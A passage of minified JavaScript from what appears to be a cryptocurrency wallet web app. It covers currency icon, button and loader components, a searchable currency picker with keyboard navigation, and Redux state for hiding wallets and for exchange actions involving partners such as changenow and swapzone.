                    return (null === (a = t.smartContract) || void 0 === a ? void 0 : a.toLocaleLowerCase()) === (null == e || null === (n = e.smartContract) || void 0 === n ? void 0 : n.toLowerCase())
                }
                )))
                    return !1
            }
            if (null != t && t.smartContract && "eth" === (null == t ? void 0 : t.family)) {
                const e = undefined;
                if (!a.find((e => {
                    var a, n;
                    return (null === (a = e.smartContract) || void 0 === a ? void 0 : a.toLocaleLowerCase()) === (null == t || null === (n = t.smartContract) || void 0 === n ? void 0 : n.toLowerCase())
                }
                )))
                    return !1
            }
            return !0
        }
          , IconCurrency = e => {
            var t;
            let {currency: a, className: n, isDisabled: r, isHidden: l, isSmallIcon: s, isMediumIcon: i} = e;
            a = a && Vl.includes((null === (t = a) || void 0 === t ? void 0 : t.toLowerCase()) || "") ? a.toLowerCase() : (0,
            be.xG)(a).toLowerCase();
            const o = useFletcherIcon(a)
              , c = (0,
            O.useCallback)(( () => {
                var e;
                return l ? ha.colorGray : o.fletcherColor ? o.fletcherColor : null !== (e = ga[a]) && void 0 !== e ? e : ha.colorBluePrimary
            }
            ), [o])
              , u = ya[`local-icon-${(0,
            be.xG)(a).toLowerCase()}`]
              , d = o.fletcherSvg || jn[a];
            if (d)
                return O.createElement("div", {
                    className: Ht()(ya.localWrapper, n, {
                        [ya.smallWrapper]: s,
                        [ya.mediumWrapper]: i
                    }),
                    style: {
                        backgroundColor: c()
                    }
                }, O.createElement("img", {
                    src: d,
                    alt: a,
                    className: Ht()(ya.localIcon, u, {
                        [ya.smallLocalIcon]: s && !(o.fletcherWidth && o.fletcherHeight),
                        [ya.mediumLocalIcon]: i && !(o.fletcherWidth && o.fletcherHeight)
                    }),
                    style: {
                        width: o.fletcherWidth,
                        height: o.fletcherHeight
                    }
                }));
            const m = ya[`icon-${(0,
            be.xG)(a).toLowerCase()}`]
              , p = ya[`fontIcon-${(0,
            be.xG)(a).toLowerCase()}`];
            return m ? O.createElement("div", {
                className: Ht()(ya.icon, ya.fontIcon, m, p, n, {
                    [ya.isDisabled]: r,
                    [ya.smallWrapper]: s,
                    [ya.smallContent]: s,
                    [ya.mediumWrapper]: i,
                    [ya.mediumContent]: i
                }),
                style: {
                    backgroundColor: c()
                }
            }) : O.createElement("div", {
                className: Ht()(ya.icon, ya[a] || ya.unknown, n, {
                    [ya.isDisabled]: r,
                    [ya.smallLocalIcon]: s,
                    [ya.mediumLocalIcon]: i
                }),
                currency: (0,
                be.xG)(a),
                style: {
                    backgroundColor: c()
                }
            })
        }
          , Kl = a.p + "32d9852e446ebbb5782d35446963c365.svg"
          , Hl = a.p + "0c97cbc0084109d129ef3ce13527918e.svg"
          , zl = a.p + "30742ba365492c09eb931b1f5b676a96.svg"
          , jl = "loader_rotating_3aqp-";
        function loader_extends() {
            loader_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return loader_extends.apply(this, arguments)
        }
        const $l = undefined
          , loader = e => {
            let {className: t, visible: a, white: n, width: r, whiteBG: l} = e;
            return a ? l ? O.createElement("img", loader_extends({
                src: zl,
                alt: "",
                className: Ht()(jl, t)
            }, r ? {
                style: {
                    width: r
                }
            } : {})) : O.createElement("img", loader_extends({
                src: n ? Hl : Kl,
                alt: "",
                className: t
            }, r ? {
                style: {
                    width: r
                }
            } : {})) : null
        }
          , Zl = {
            button: "button_button_3_BTF",
            isLoadingButton: "button_isLoadingButton_1nX4e",
            loader: "button_loader_Bsf5H",
            loaderWrapper: "button_loaderWrapper_pOPNI",
            blue: "button_blue_3kfMO",
            red: "button_red_1MpEV",
            white: "button_white_3tVCq",
            orange: "button_orange_PKpjm",
            simple: "button_simple_36A9M",
            "light-blue": "button_light-blue_1u3l2",
            "transparent-blue": "button_transparent-blue_1_mAX",
            big: "button_big_2giaQ",
            large: "button_large_2gzy6",
            small: "button_small_MkI59",
            "radius-large": "button_radius-large_mNh3E"
        }
          , Button = e => {
            let {className: t, children: a, color: n, disabled: r, size: l, id: s, radius: i, isLoading: o, onClick: c, type: u, loaderBlueInLightTheme: d, "data-test-name": m} = e;
            const p = (0,
            $.v9)(Ot)
              , handleClick = e => {
                o || c && c(e)
            }
            ;
            return o ? O.createElement("div", {
                className: Zl.loaderWrapper
            }, O.createElement(loader, {
                visible: !0,
                white: "dark" === p || !d && n && n.includes("blue"),
                width: 24,
                className: Zl.loader
            })) : O.createElement("button", {
                id: s,
                className: Ht()(Zl.button, n && Zl[n], l && Zl[l], Zl[`radius-${i}`], t, {
                    [Zl.isLoadingButton]: o
                }),
                disabled: r,
                onClick: handleClick,
                type: null != u ? u : "button",
                "data-test-name": m
            }, a)
        }
          , Yl = Button;
        var ql = a(88286)
          , Xl = a.n(ql);
        function debounce(e) {
            var t, a;
            let n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 50, r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}, l;
            const s = null !== (t = r.isImmediate) && void 0 !== t && t
              , i = null !== (a = r.callback) && void 0 !== a && a
              , {maxWait: o} = r;
            let c = Date.now()
              , u = [];
            function nextInvokeTimeout() {
                if (void 0 !== o) {
                    const e = Date.now() - c;
                    if (e + n >= o)
                        return o - e
                }
                return n
            }
            const d = function debouncedFunction() {
                for (var t = arguments.length, a = new Array(t), n = 0; n < t; n++)
                    a[n] = arguments[n];
                const r = this
                  , o = new Promise(( (t, n) => {
                    const o = function invokeFunction() {
                        l = void 0;
                        c = Date.now();
                        if (!s) {
                            const t = e.apply(r, a);
                            i && i(t);
                            u.forEach((e => {
                                let {resolve: a} = e;
                                return a(t)
                            }
                            ));
                            u = []
                        }
                    }
                      , d = s && void 0 === l;
                    void 0 !== l && clearTimeout(l);
                    l = setTimeout(o, nextInvokeTimeout());
                    if (d) {
                        const n = e.apply(r, a);
                        i && i(n);
                        return t(n)
                    }
                    u.push({
                        resolve: t,
                        reject: n
                    })
                }
                ));
                o.catch(( () => {}
                ));
                return o
            };
            d.cancel = function debouncedFunctionCancel(e) {
                void 0 !== l && clearTimeout(l);
                u.forEach((t => {
                    let {reject: a} = t;
                    return a(e)
                }
                ));
                u = []
            }
            ;
            return d
        }
        const Ql = {
            wrapper: "input-currency_wrapper_1VYot inputs_wrapper_2IV3F",
            inputWrapper: "input-currency_inputWrapper_1I11Y inputs_inputWrapper_k3xth",
            placeholder: "input-currency_placeholder_3QADx",
            isOpen: "input-currency_isOpen_2YK6j",
            iconArrow: "input-currency_iconArrow_2cUqL inputs_iconArrow_2EDQu",
            wrapperList: "input-currency_wrapperList_3yOyv",
            searchWrapper: "input-currency_searchWrapper_1cCHB",
            inputSearch: "input-currency_inputSearch_1y2JP",
            emptyState: "input-currency_emptyState_3m-GP",
            currencyTicker: "input-currency_currencyTicker_29Y8w",
            currencyBlock: "input-currency_currencyBlock_2AqhZ inputs_currencyBlock_2rgQZ",
            currencyData: "input-currency_currencyData_S0KpS inputs_currencyInfo_rdtMm",
            "ticker-bch": "input-currency_ticker-bch_P7yf3",
            listTitle: "input-currency_listTitle_3aoh5"
        }
          , Jl = {
            wrapper: "input-wallets_wrapper_12X6h inputs_wrapper_2IV3F",
            wrapperText: "input-wallets_wrapperText_1LOLx",
            itemsBlock: "input-wallets_itemsBlock_3y6zo",
            stickyHeader: "input-wallets_stickyHeader_2qCaZ",
            div: "input-wallets_div_3Q2ml",
            subHeader: "input-wallets_subHeader_3dgEr",
            inputWrapper: "input-wallets_inputWrapper_gym-U inputs_inputWrapper_k3xth",
            isOpen: "input-wallets_isOpen_3OvSx",
            isInactive: "input-wallets_isInactive_2fhTC",
            isNoBorder: "input-wallets_isNoBorder_14luU",
            isBoxSizing: "input-wallets_isBoxSizing_3iYJm",
            withAddress: "input-wallets_withAddress_2kVTM",
            addressWrapper: "input-wallets_addressWrapper_V2MC3",
            arrowWrapper: "input-wallets_arrowWrapper_1yBAS",
            refIcon: "input-wallets_refIcon_3mKfy inputs_iconArrow_2EDQu",
            withAddressWrapper: "input-wallets_withAddressWrapper_1oPM_",
            placeholder: "input-wallets_placeholder_Ehxys",
            placeholderSelectorWithValue: "input-wallets_placeholderSelectorWithValue_e0dCJ",
            noMargin: "input-wallets_noMargin_28pou",
            iconArrow: "input-wallets_iconArrow_14i5R inputs_iconArrow_2EDQu",
            newIconArrow: "input-wallets_newIconArrow_31IB_",
            iconNewSelector: "input-wallets_iconNewSelector_1-C03",
            newSelectorWithValueIcon: "input-wallets_newSelectorWithValueIcon_X1W4r",
            wrapperList: "input-wallets_wrapperList_3_p-x",
            newWrapperList: "input-wallets_newWrapperList_3xL57",
            newScrollBar: "input-wallets_newScrollBar_TD90z",
            currencySubBlock: "input-wallets_currencySubBlock_R6ATi inputs_currencyBlock_2rgQZ",
            currencyBlock: "input-wallets_currencyBlock_1Qv6o inputs_currencyBlock_2rgQZ",
            isTestnet: "input-wallets_isTestnet_1ftcx",
            listTicker: "input-wallets_listTicker_MsBXH",
            selectedItem: "input-wallets_selectedItem_3ptgW",
            currencyInfo: "input-wallets_currencyInfo_3uZGe inputs_currencyInfo_rdtMm",
            clearMarginLeft: "input-wallets_clearMarginLeft_3Oj8s",
            newTicker: "input-wallets_newTicker_3H0H_",
            newSelectorTicker: "input-wallets_newSelectorTicker_1omzg",
            selectedSubWallet: "input-wallets_selectedSubWallet_1PRPe",
            selectorWithValueTicker: "input-wallets_selectorWithValueTicker_2DW5u",
            walletInfo: "input-wallets_walletInfo_1Nxl0",
            subInfoWallet: "input-wallets_subInfoWallet_fKRHa",
            subInfoWalletSelected: "input-wallets_subInfoWalletSelected_15P26",
            subInfoFakeWalletSelected: "input-wallets_subInfoFakeWalletSelected_1clj_",
            spaceBetween: "input-wallets_spaceBetween_245ro",
            paddingRight: "input-wallets_paddingRight_2Qp6-",
            currencyBlockSelectorWithValue: "input-wallets_currencyBlockSelectorWithValue_2zB7d",
            walletTitleWrapper: "input-wallets_walletTitleWrapper_uJYuJ",
            addressTooltip: "input-wallets_addressTooltip_3GS77",
            subWalletTooltip: "input-wallets_subWalletTooltip_1K5O-",
            currencyTooltipWrapper: "input-wallets_currencyTooltipWrapper_3umWr",
            currencyTooltipText: "input-wallets_currencyTooltipText_1RamP",
            walletInfoAbsolute: "input-wallets_walletInfoAbsolute_sXENs",
            walletInfoCurrency: "input-wallets_walletInfoCurrency_33bTL",
            titleWrapper: "input-wallets_titleWrapper_Quc8F",
            hideInfo: "input-wallets_hideInfo_BwIQY",
            mainWalletInfo: "input-wallets_mainWalletInfo_3bDI_",
            subInfoWalletWithoutValue: "input-wallets_subInfoWalletWithoutValue_3-2oP",
            currencyInfoWithValue: "input-wallets_currencyInfoWithValue_2u4uK",
            currencyInfoWithoutValue: "input-wallets_currencyInfoWithoutValue_36nPe",
            currencyInfoWithValueSelected: "input-wallets_currencyInfoWithValueSelected_2G_HW",
            subInfoWalletWithValues: "input-wallets_subInfoWalletWithValues_3Dstz",
            subInfoWalletWithValuesSelected: "input-wallets_subInfoWalletWithValuesSelected_sAWue",
            walletName: "input-wallets_walletName_UPsg2",
            walletType: "input-wallets_walletType_1hbsh",
            walletTypeWithValue: "input-wallets_walletTypeWithValue_PHJtm",
            walletTypeWithValueSelected: "input-wallets_walletTypeWithValueSelected_2N_vG",
            walletBalance: "input-wallets_walletBalance_3mRgu",
            iconMarginRigt: "input-wallets_iconMarginRigt_1ZSBh",
            miniIconWrapper: "input-wallets_miniIconWrapper_3MsdY",
            miniIconImg: "input-wallets_miniIconImg_ZXXPG",
            titleContainer: "input-wallets_titleContainer_3LQfL",
            titleContainerWithValue: "input-wallets_titleContainerWithValue_1llxs",
            titleContainerNewSelector: "input-wallets_titleContainerNewSelector_dXoDW",
            overflowVisible: "input-wallets_overflowVisible_24tor",
            inlineBlock: "input-wallets_inlineBlock_3LSJR",
            selectedTicker: "input-wallets_selectedTicker_2Gaai",
            "is-no-visible": "input-wallets_is-no-visible_3JCnr",
            colorTooltip: "input-wallets_colorTooltip_3BGMz",
            walletTitle: "input-wallets_walletTitle_P3P-E",
            walletTitleWithValue: "input-wallets_walletTitleWithValue_3S46G",
            infoAboutBalance: "input-wallets_infoAboutBalance_SaGPj",
            selectedWrapper: "input-wallets_selectedWrapper_W8qVy",
            emptyState: "input-wallets_emptyState_3fzRM",
            searchWrapper: "input-wallets_searchWrapper_2WkSQ",
            newSearchWrapper: "input-wallets_newSearchWrapper_3isHx",
            searchWrapperWithValue: "input-wallets_searchWrapperWithValue_LCymE",
            searchInput: "input-wallets_searchInput_1MJp1",
            newSearchInput: "input-wallets_newSearchInput_Wj0Gx",
            displayNone: "input-wallets_displayNone_22HIg",
            searchInputWithValue: "input-wallets_searchInputWithValue_dyHH3",
            SearchIcon: "input-wallets_SearchIcon_3H45Z",
            isDisabled: "input-wallets_isDisabled_38xcL",
            isInsufficientFunds: "input-wallets_isInsufficientFunds_2FHLL",
            walletsLoader: "input-wallets_walletsLoader_1L4vh",
            isHidden: "input-wallets_isHidden_3INLA",
            focusItem: "input-wallets_focusItem_3uIxi",
            icon: "input-wallets_icon_xMp0s change-password_icon_2B12u",
            clearPassIcon: "input-wallets_clearPassIcon_3Et99 change-password_clearPassIcon_SWaqm"
        };
        function useKeyboardNavigator(e) {
            let {enterHandler: t, noScrolling: a, noFirstElSelected: n, isSelectFirstSubwallet: r, notSelectParentWallet: l, isNavForNewSelectors: s, search: i} = e;
            const [o,c] = (0,
            O.useState)()
              , u = (0,
            O.useRef)(null);
            (0,
            O.useEffect)(( () => {
                if (r) {
                    var e, t, a;
                    c(null !== (e = null === (t = u.current) || void 0 === t || null === (a = t.firstElementChild) || void 0 === a ? void 0 : a.nextElementSibling) && void 0 !== e ? e : void 0)
                } else if (n || s) {
                    if (s) {
                        var l, i, o, d;
                        c(null !== (l = null === (i = u.current) || void 0 === i || null === (o = i.firstElementChild) || void 0 === o || null === (d = o.firstElementChild) || void 0 === d ? void 0 : d.nextElementSibling) && void 0 !== l ? l : void 0)
                    }
                } else {
                    var m, p;
                    c(null !== (m = null === (p = u.current) || void 0 === p ? void 0 : p.firstElementChild) && void 0 !== m ? m : void 0)
                }
            }
            ), [i]);
            (0,
            O.useEffect)(( () => {
                if (o) {
                    o.classList.add(Jl.focusItem);
                    a || o.scrollIntoView({
                        block: "nearest",
                        inline: "nearest",
                        behavior: "smooth"
                    })
                }
            }
            ), [o]);
            const arrowNavigation = e => {
                let {key: a} = e;
                switch (a) {
                case "ArrowDown":
                    if (o && o.isConnected)
                        c((e => {
                            var t, a, n, r, i, o, c;
                            const u = !(null != e && e.nextElementSibling) && (null == e || null === (t = e.parentElement) || void 0 === t || null === (a = t.nextElementSibling) || void 0 === a || null === (n = a.dataset) || void 0 === n ? void 0 : n.itemsBlock);
                            if (!(null != e && e.nextElementSibling || u))
                                return e;
                            null == e || e.classList.remove(Jl.focusItem);
                            const d = u ? null == e || null === (r = e.parentElement) || void 0 === r || null === (i = r.nextElementSibling) || void 0 === i || null === (o = i.firstElementChild) || void 0 === o ? void 0 : o.nextElementSibling : null == e ? void 0 : e.nextElementSibling;
                            if (!d)
                                return e;
                            if (l && (null === (c = d.dataset) || void 0 === c || !c.parentWalletUuid) && !s) {
                                var m;
                                return null == e || null === (m = e.nextElementSibling) || void 0 === m ? void 0 : m.nextElementSibling
                            }
                            return s ? d : null == e ? void 0 : e.nextElementSibling
                        }
                        ));
                    else {
                        var n, r;
                        c(null !== (n = null === (r = u.current) || void 0 === r ? void 0 : r.firstElementChild) && void 0 !== n ? n : void 0)
                    }
                    break;
                case "ArrowUp":
                    if (o && o.isConnected)
                        c((e => {
                            var t, a, n, r, i;
                            const o = s && (null == e || null === (t = e.previousElementSibling) || void 0 === t || null === (a = t.dataset) || void 0 === a ? void 0 : a.blockHeader) && !(null != e && null !== (n = e.parentElement) && void 0 !== n && n.previousElementSibling);
                            if (null == e || !e.previousElementSibling || o)
                                return e;
                            if (l) {
                                var c, u, d;
                                const t = null == e ? void 0 : e.previousElementSibling;
                                if (null !== (c = t.dataset) && void 0 !== c && c.parentWalletUuid || null == e || null === (u = e.previousElementSibling) || void 0 === u || !u.previousElementSibling) {
                                    if (null !== (d = t.dataset) && void 0 !== d && d.parentWalletUuid) {
                                        null == e || e.classList.remove(Jl.focusItem);
                                        return t
                                    }
                                    return e
                                }
                                var m;
                                null == e || e.classList.remove(Jl.focusItem);
                                return null === (m = e.previousElementSibling) || void 0 === m ? void 0 : m.previousElementSibling
                            }
                            null == e || e.classList.remove(Jl.focusItem);
                            if (s && null != e && null !== (r = e.previousElementSibling) && void 0 !== r && null !== (i = r.dataset) && void 0 !== i && i.blockHeader) {
                                var p, f;
                                return null == e || null === (p = e.parentElement) || void 0 === p || null === (f = p.previousElementSibling) || void 0 === f ? void 0 : f.lastElementChild
                            }
                            return null == e ? void 0 : e.previousElementSibling
                        }
                        ));
                    else {
                        var i, d;
                        c(null !== (i = null === (d = u.current) || void 0 === d ? void 0 : d.lastElementChild) && void 0 !== i ? i : void 0)
                    }
                    break;
                case "Enter":
                    o && t(o)
                }
            }
            ;
            return {
                arrowNavigation,
                listRef: u,
                selectedItem: o
            }
        }
        const es = useKeyboardNavigator;
        var ts = a(45697)
          , as = a.n(ts);
        const ns = 52
          , checkIsWalletMatchSearch = (e, t) => {
            var a, n;
            return !t || ((null == e || null === (a = e.currency) || void 0 === a ? void 0 : a.toLowerCase().includes(t.toLowerCase() || "")) || (null == e || null === (n = e.title) || void 0 === n ? void 0 : n.toLowerCase().includes(t.toLowerCase() || "")))
        }
          , calculateHeight = e => Math.min(e * ns, 300)
          , getSubWalletTitleLength = (e, t, a) => a ? 15 : e ? e && t ? 10 : 14 : 20
          , getCurrentItem = (e, t, a) => a ? e[t].item : e[t]
          , isItemHeader = e => Boolean(e.props["data-block-header"]);
        var rs = a(94274);
        const useListNavigation = e => {
            let {listRef: t, renderResult: a, isWithHeaders: n, enterHandler: r} = e;
            const [l,s] = (0,
            O.useState)(0)
              , handleMouseMove = () => {
                (l || 0 === l) && s(void 0)
            }
            ;
            (0,
            O.useEffect)(( () => {
                const handleKeyDown = e => {
                    switch (e.key) {
                    case "ArrowDown":
                        s((e => {
                            const t = Math.min((e || 0) + 1, a.length - 1)
                              , r = getCurrentItem(a, t, n);
                            return isItemHeader(r) ? Math.min(t + 1, a.length - 1) : t
                        }
                        ));
                        break;
                    case "ArrowUp":
                        s((e => {
                            const t = Math.max((e || 0) - 1, 0)
                              , r = getCurrentItem(a, t, n);
                            return isItemHeader(r) ? Math.max(t - 1, 0) : t
                        }
                        ));
                        break;
                    case "Enter":
                        if (a && (l || 0 === l) && r) {
                            const e = getCurrentItem(a, l, n);
                            r(e)
                        }
                    }
                }
                ;
                document.addEventListener("keydown", handleKeyDown);
                return () => {
                    document.removeEventListener("keydown", handleKeyDown)
                }
            }
            ), [r, l, n, a, a.length]);
            (0,
            O.useEffect)(( () => {
                const e = t.current;
                e && void 0 !== l && e.scrollToRow(l)
            }
            ), [l, t]);
            return {
                focusedIndex: l,
                handleMouseMove
            }
        }
          , VirtualizedList = e => {
            var t;
            let {walletsToRender: a, isWithHeaders: n, search: r, enterHandler: l} = e;
            const [s,i] = (0,
            O.useState)(void 0)
              , o = null === (t = a[0]) || void 0 === t ? void 0 : t.header
              , c = (0,
            O.useRef)(null)
              , [u,d] = (0,
            O.useState)(void 0)
              , m = (0,
            O.useMemo)(( () => n && a.length ? a.slice(1) : a), [n, a])
              , {focusedIndex: p, handleMouseMove: f} = useListNavigation({
                listRef: c,
                renderResult: m,
                isWithHeaders: n,
                enterHandler: l
            });
            (0,
            O.useEffect)((function onUpdateHeader() {
                i(void 0)
            }
            ), [r]);
            const onRowsRendered = e => {
                i(a[e.startIndex].header)
            }
              , resetScroll = async () => {
                await d(0);
                await d(void 0)
            }
            ;
            (0,
            O.useEffect)(( () => {
                resetScroll()
            }
            ), [r]);
            return 0 === a.length ? null : O.createElement(O.Fragment, null, n && O.createElement("div", {
                className: Ht()(Jl.wrapperText, Jl.stickyHeader)
            }, s || o), O.createElement("div", {
                style: {
                    width: "100%",
                    height: calculateHeight(m.length)
                },
                onMouseMove: f
            }, O.createElement(rs.qj, null, (e => {
                let {width: t, height: a} = e;
                return O.createElement(rs.aV, {
                    scrollTop: u,
                    ref: c,
                    width: t,
                    height: a,
                    rowHeight: ns,
                    rowCount: m.length,
                    onRowsRendered: n ? onRowsRendered : void 0,
                    rowRenderer: e => {
                        let {key: t, index: a, style: r} = e;
                        const l = getCurrentItem(m, a, n)
                          , s = a === p
                          , i = Ht()({
                            [Jl.focusItem]: s
                        });
                        return O.createElement("div", {
                            key: t,
                            style: r,
                            className: i
                        }, l)
                    }
                })
            }
            ))))
        }
          , ls = O.forwardRef(( (e, t) => {
            const {handleSearchKeyUp: a, handleSearch: n, handleSelect: r, getJSXWithItem: l, searchWithSeparation: s, listOfCurrencies: i, listOfAllFletcherTokens: o, isWithTokens: c} = e
              , selectedItem = e => {
                var t;
                const a = null == e ? void 0 : e.currentTarget;
                let n, l, s, i;
                if (a) {
                    n = a.dataset.title;
                    l = a.dataset.ticker;
                    s = a.dataset.family;
                    i = a.dataset.contract
                } else if (e.dataset) {
                    n = e.dataset.title;
                    l = e.dataset.ticker;
                    s = e.dataset.family;
                    i = e.dataset.contract
                } else {
                    n = e.props["data-title"];
                    l = e.props["data-ticker"];
                    s = e.props["data-family"];
                    i = e.props["data-contract"]
                }
                r({
                    title: n,
                    ticker: l,
                    family: s,
                    smartContract: null !== (t = i) && void 0 !== t ? t : null
                })
            }
              , {arrowNavigation: u, listRef: d} = es({
                enterHandler: selectedItem
            });
            return O.createElement("div", {
                className: Ql.wrapperList,
                ref: t
            }, O.createElement("div", {
                className: Ql.searchWrapper,
                onKeyDown: u
            }, O.createElement("input", {
                autoFocus: !0,
                className: Ql.inputSearch,
                onKeyUp: a,
                placeholder: "Type a currency",
                onChange: n,
                spellCheck: "false",
                autoCorrect: "off",
                autoComplete: "off"
            })), !(null != i && i.length) && !(null != o && o.length) && O.createElement("div", {
                className: Ql.emptyState
            }, "Currency not found"), i && !s && !!i.length && O.createElement("div", null, O.createElement(VirtualizedList, {
                enterHandler: selectedItem,
                isWithHeaders: !1,
                walletsToRender: i.map((e => O.createElement("div", {
                    className: Ql.currencyBlock,
                    key: `select-currency${e.ticker}-${e.family}`,
                    "data-title": e.title,
                    "data-ticker": e.ticker,
                    "data-family": e.family,
                    "data-contract": e.smartContract,
                    onClick: selectedItem
                }, l(e))))
            })), i && s && !!i.length && O.createElement("div", {
                ref: d
            }, c && O.createElement("p", {
                className: Ql.listTitle
            }, "add coins"), i.map((e => O.createElement("div", {
                className: Ql.currencyBlock,
                key: `select-currency${e.ticker}-${e.family}-${null == e ? void 0 : e.key}-${null == e ? void 0 : e.address}`,
                "data-title": e.title,
                "data-ticker": e.ticker,
                "data-family": e.family,
                "data-contract": e.smartContract,
                onClick: selectedItem
            }, l(e))))), o && s && !!o.length && O.createElement("div", {
                ref: d
            }, O.createElement("p", {
                className: Ql.listTitle
            }, "add tokens"), o.map((e => O.createElement("div", {
                className: Ql.currencyBlock,
                key: `select-currency${e.ticker}-${e.family}-${null == e ? void 0 : e.key}-${null == e ? void 0 : e.address}`,
                "data-title": e.title,
                "data-ticker": e.ticker,
                "data-family": e.family,
                "data-contract": e.smartContract,
                onClick: selectedItem
            }, l(e))))))
        }
        ))
          , ss = ls;
        ls.propTypes = {
            handleSearchKeyUp: as().func,
            handleSearch: as().func,
            handleSelect: as().func,
            getJSXWithItem: as().func,
            list: as().array
        };
        var is = a(2707)
          , os = a(68216)
          , cs = a(79433);
        const us = (0,
        te.createAction)("@settings/UPDATE_HIDE_WALLETS")()
          , ds = (0,
        te.createAction)("@settings/TOGGLE_HIDE_MODE")()
          , ms = (0,
        te.createAction)("@settings/TOGGLE_ZERO_BALANCE_MODE")()
          , ps = (0,
        te.createAction)("@settings/SET_DEFAULT_MODE")()
          , fs = (0,
        te.createAction)("@settings/TOGGLE_HIDE_TOKENS_MODE")()
          , Es = (0,
        te.createAction)("@settings/TOGGLE_HIDE_UNKNOWN_TOKENS_MODE")()
          , hs = {
            uuids: [],
            isHidden: !0,
            isZeroBalanceVisible: !1,
            areTokensHidden: !1,
            areUnknownTokensHidden: !1
        }
          , gs = "hide-wallets"
          , ys = ["uuids", "isHidden", "isZeroBalanceVisible", "areTokensHidden", "areUnknownTokensHidden"]
          , vs = (0,
        te.createReducer)(hs).handleAction(us, ( (e, t) => {
            let {payload: {uuids: a}} = t;
            return {
                ...e,
                uuids: [...a]
            }
        }
        )).handleAction(ms, (e => ({
            ...e,
            isZeroBalanceVisible: !e.isZeroBalanceVisible
        }))).handleAction(ds, (e => ({
            ...e,
            isHidden: !e.isHidden
        }))).handleAction(fs, (e => ({
            ...e,
            areTokensHidden: !e.areTokensHidden
        }))).handleAction(Es, (e => ({
            ...e,
            areUnknownTokensHidden: !e.areUnknownTokensHidden
        }))).handleAction(ne, ( () => ({
            uuids: [],
            isHidden: !1,
            isZeroBalanceVisible: !1,
            areTokensHidden: !1,
            areUnknownTokensHidden: !1
        })))
          , selectHideWallets = e => e[gs]
          , _s = (0,
        _t.P1)(selectHideWallets, (e => {
            let {uuids: t} = e;
            return t || []
        }
        ))
          , ws = (0,
        _t.P1)(selectHideWallets, (e => {
            let {isHidden: t=!0} = e;
            return t
        }
        ))
          , bs = (0,
        _t.P1)(selectHideWallets, (e => {
            let {isZeroBalanceVisible: t=!0} = e;
            return t
        }
        ))
          , ks = (0,
        _t.P1)(selectHideWallets, (e => {
            let {areTokensHidden: t=!0} = e;
            return t
        }
        ))
          , Ss = (0,
        _t.P1)(selectHideWallets, (e => {
            let {areUnknownTokensHidden: t=!0} = e;
            return t
        }
        ))
          , hideWallet = e => (t, a) => {
            const n = a()
              , r = _s(n);
            r.push(e.uuid);
            t(us({
                uuids: r
            }))
        }
          , showWallet = e => async (t, a) => {
            const n = a();
            let r = _s(n).filter((t => t !== e.uuid));
            r = r.filter((t => t !== e.uuid));
            t(us({
                uuids: r
            }))
        }
          , clearAllHidenWallets = () => async e => {
            e(us({
                uuids: []
            }))
        }
          , toggleVisibilityWallet = e => (t, a) => {
            const n = a()
              , r = undefined;
            _s(n).indexOf(e.uuid) > -1 ? t(showWallet(e)) : t(hideWallet(e))
        }
          , Cs = "@exchange"
          , Ns = "exchange"
          , Ts = "@exchange/SET_EXCHANGE_CURRENCIES"
          , As = "@exchange/FETCH_EXCHANGE_CURRENCIES"
          , xs = "@exchange/SET_FAILED_FETCH_ESTIMATE"
          , Is = "@exchange/SET_EXCHANGE_PARTNER"
          , Ps = "@exchange/SET_EXCHANGE_CAPTCHA"
          , Ls = "@exchange/SET_ALL_TOKENS"
          , Fs = "@exchange/FETCH_ALL_TOKENS"
          , Ws = "@exchange/CREATE_TRANSACTION"
          , Rs = "@exchange/CREATE_ORDER_INFO"
          , Bs = "@exchange/SET_CREATED_TRANSACTION"
          , Os = "@exchange/SET_ORDER_INFO"
          , Ds = "@exchange/SET_ORDER_ERROR"
          , Ms = "@exchange/SET_EXCHANGE_ERROR"
          , Us = "@exchange/FETCH_EXCHANGE_TRANSACTION"
          , Gs = "@exchange/CREATE_DUSTER_INVOICE"
          , Vs = "@exchange/SET_DUSTER_INVOICE"
          , Ks = "@exchange/SET_IS_APPLYABLE_FOR_DUST_REQUEST"
          , Hs = "@exchange/SET_MAIN_PAGE_STEP"
          , zs = "@exchange/SET_WALLET_TO"
          , js = "@exchange/SET_WALLET_FROM"
          , $s = "@exchange/SET_EXCHANGE_STATUS"
          , Zs = "@exchange/SET_EXCHANGE_STATUS_HISTORY"
          , Ys = "@exchange/RESET_EXCHANGE_STATUS_HISTORY"
          , qs = "@exchange/SET_IS_FETCHING_EXCHANGE_TX"
          , Xs = "@exchange/CREATE_EXCHANGE_ASSETS_LIST"
          , Qs = "@exchange/SET_EXCHANGE_ASSETS_LIST"
          , Js = "@exchange/SET_SEND_ASSETS_RESPONSE"
          , ei = "@exchange/SET_CLEAR_EXCHANGE_STORE"
          , ti = "@exchange/INITIALIZE_TOKEN_DATA_UPDATER"
          , ai = "@exchange/FETCH_EXCHANGE_INFO"
          , ni = "@exchange/SET_EXCHANGE_INFO"
          , ri = "@exchange/SET_AMOUNT"
          , li = "@exchange/SET_LAST_CURRENCIES_FETCHED"
          , si = "waiting"
          , ii = "confirming"
          , oi = "exchanging"
          , ci = "sending"
          , ui = undefined
          , di = "failed"
          , mi = [si, ii, oi, ci, "finished"]
          , pi = "Reject duster invoice"
          , fi = "Empty amount error"
          , Ei = "Amount is out of range"
          , hi = "Fill all necessary fields"
          , gi = "Something went wrong, please try again later"
          , yi = "FETCH_SUCCESS"
          , vi = "FETCH_ERROR"
          , _i = "NO_REQUIRED_PARAMS"
          , wi = "AMOUNT_IS_OUT_OF_RANGE"
          , bi = "NOT_SUPPORTED_TOKEN"
          , ki = "changenow"
          , Si = "swapzone"
          , Ci = "swft"
          , Ni = "@exchange/FETCH_TOTAL_GETH_BALANCE"
          , Ti = "@exchange/SET_TOTAL_GETH_BALANCE.commit"
          , Ai = "changenow"
          , exchangeStateSelector = e => e.exchange
          , isAllBalanceUpdating = e => e["wallet-updater"].isAllBalanceUpdating
          , xi = (0,
        _t.P1)(exchangeStateSelector, (e => {
            var t;
            return null !== (t = e.currencies) && void 0 !== t ? t : []
        }
        ))
          , Ii = (0,
        _t.P1)(exchangeStateSelector, (e => e.lastCurrenciesFetched))
          , Pi = (0,
        _t.P1)(exchangeStateSelector, (e => e.partner))
          , Li = (0,
        _t.P1)(exchangeStateSelector, (e => e.captchaCode || ""))
          , Fi = (0,
